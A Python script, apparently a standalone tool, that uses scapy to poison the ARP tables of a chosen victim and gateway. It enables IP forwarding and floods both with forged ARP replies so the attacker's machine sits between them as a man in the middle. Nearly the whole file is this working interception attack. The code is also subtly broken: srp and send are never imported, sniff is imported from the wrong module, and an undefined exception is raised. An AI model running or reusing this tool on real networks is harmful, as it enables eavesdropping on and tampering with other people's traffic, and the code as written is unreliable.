from scapy.layers.l2 import ARP, Ether, sniff
from termcolor import cprint
import argparse
import time
import os

class NoTargetSpecified(Exception):
    '''
    Error raised if the user doesn't specify a valid target IP address
    '''

    pass

class NoGatewaySpecified(Exception):
    '''
    Error raised if the user doesn't specify a valid gateway IP address
    '''

    pass

def get_MAC(ip):
    '''
    Evaluate MAC address of a specific IP
    '''

    #ARP request of resolution of IP address ip
    arp_header = ARP(pdst=ip) 
    
    #ARP request sent in broadcast to all hosts connected in the network
    eth_header = Ether(dst="ff:ff:ff:ff:ff:ff")
    
    #Creation of packet by appending ARP packet to Ethernet header
    packet = eth_header/arp_header
    
    #Send packet of layer 2 to each user in the network
    #and wait for timeout seconds for the response
    #response_list = srp()[0]= answers
    #response_list[1]=unanswered
    response_list = srp(packet, timeout=1, verbose=False)[0]
    
    #response_list[0] correspond to first response 
    #(we want to obtain MAC of a specific IP address)
    #first_element[0] = request done for which I obtain a respons
    #first_element[1] = response to request
    return response_list[0][1].hwsrc

def spoof(victim_IP, victim_MAC, spoof_IP):
    '''
    Send ARP response to update MAC address of spoof_ip on victim_IP ARP table
    '''
    #Update ARP table of victim sending an ARP packet
    packet = ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=spoof_IP)
    send(packet, verbose=False)

def check_format_IP(IP_address):
    '''
    Evaluate if IP_address is valid
    '''

    #Split the IP address in the fields separated by '.'
    IP_numbers = IP_address.split('.')
    
    #Error in the format if the number of fields is != 4 
    if len(IP_numbers)!=4:
        raise NoNetworkSpecified
    else:
        #Check if each field has valid value (>=0 and <256)
        for num in IP_numbers:
            if(int(num)>255 or int(num)<0):
                raise NoNetworkSpecified

    return IP_address

def reset_arp_tables(target_IP, target_MAC, gateway_IP, gateway_MAC):
    '''
    Reset ARP tables of gateway and victim by sending ARP responses
    '''

    packet = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=gateway_IP, hwsrc=gateway_MAC)
    send(packet, count=4, verbose=False)
    packet = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, psrc=target_IP, hwsrc=target_MAC)
    send(packet, count=4, verbose=False)

def args_parser():
    '''
    Parser of command line arguments
    '''

    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-target", "-t", dest="target", help="IP address of the victim")
    parser.add_argument("-gateway", "-g", dest="gateway", help="IP address of the gateway of the network")
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    try:
        if not args.target:
            raise NoTargetSpecified
        
        if not args.gateway:
            raise NoGatewaySpecified
        
        target_IP=check_format_IP(args.target)
        cprint('\nTarget  address:   ', 'yellow', attrs=['bold',], end='')
        print(f'{target_IP}')
        gateway_IP=check_format_IP(args.gateway)
        cprint('Gateway  address:  ', 'green', attrs=['bold',], end='')
        print(f'{gateway_IP}', end='\n\n')

    except (NoTargetSpecified, NoGatewaySpecified) as e :
        parser.print_help()
        exit(0)

    return target_IP, gateway_IP

def main():
    #Needed operation to guarantee that the machine works forwarding machine
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    #Obtain MAC address of specified IP addresses
    target_IP, gateway_IP = args_parser()
    target_MAC = get_MAC(target_IP)
    gateway_MAC = get_MAC(gateway_IP)
    num_pkts = 0

    #To establish MITM connection, we need to repeat the update of ARP 
    #table for victim and gateway otherwise it is automatically reset
    try:
        while True:
            #Send ARP response to target_IP so my PC pretends to be the gateway
            #sending my MAC as Ethernet Address of packet 
            spoof(target_IP, target_MAC, gateway_IP)
            #Send ARP response to gateway_IP so my PC pretends to be the target
            #sending my MAC as Ethernet Address of packet
            spoof(gateway_IP, gateway_MAC, target_IP)
            num_pkts += 2
            print('\rPackets sent: ', end='')
            cprint('{:>5}'.format(num_pkts), 'blue', attrs=['bold',], end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[Detected CTRL+C] Closing the program...", end='\n\n')
        reset_arp_tables(target_IP, target_MAC, gateway_IP, gateway_MAC)


if __name__=="__main__":
    main()
